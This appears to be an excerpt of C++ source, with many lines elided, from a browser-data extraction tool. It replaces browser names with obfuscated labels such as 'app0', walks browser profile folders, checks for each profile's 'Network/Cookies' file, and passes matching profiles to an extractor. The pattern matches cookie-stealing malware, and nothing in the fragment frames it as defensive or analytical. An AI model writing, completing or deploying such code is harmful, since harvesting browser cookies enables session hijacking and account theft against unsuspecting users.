...
std::string ObfuscateBrowserName(const std::string& browserName) {
    ...
    auto it = mapping.find(browserName);
    if (it != mapping.end()) {
        return it->second;
    }
    return "app0";
                ...
                try {
                    if (entry.is_directory()) {
                        if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                            ...
                            extractor.ProcessProfile(entry.path(), ObfuscateBrowserName(browser.name));
                        }
                    }
                } catch (...) {
